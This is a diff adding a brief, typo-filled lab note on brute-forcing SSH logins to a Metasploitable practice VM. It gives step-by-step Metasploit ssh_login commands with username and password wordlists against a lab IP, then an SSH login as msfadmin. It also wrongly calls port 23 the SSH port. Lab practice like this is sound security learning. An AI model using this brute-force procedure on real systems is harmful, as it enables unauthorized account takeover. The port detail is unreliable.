@@ -1,0 +1,33 @@
+try to hack metasploitable via ssh:
+
+we know that ssh is open port on metasploitable 23 
+
+Here we are tring to hack metasploitable via brute force tecqunic into ssh 23 port
+
+IN this attact we are not tring to find flow of the ssh but we are assume that some body 
+excess ssh with weak password and user name. So we are tring to gase user name and password to
+assess as a admin. 
+
+for that we use username.txt and password.txt file (where lot's of common user name and 
+password have) but we use few username and password for timing porpuse.
+
+for macthing password:
+
+stap1: type in terminal msfconsole
+stap2: search for ssh_login
+stap3: use 0 from that search result
+stap4: options
+stap5: set remote hosts bye typing (set RHOSTS 10.0.2.5)
+stap6: set VERBOSE true
+stap7: set STOP_ON_SUCCESS true 
+stap8: set USER_FILE path_of_the_file
+stap9: set PASS_FILE path_of_the_pass_file
+stap10:run
+
+for exploit via knowing password:
+ssh msfadmin@targe_machine_ip
+and than give password of this target machine 
+
+that's it boom now we hack that machine
+
+
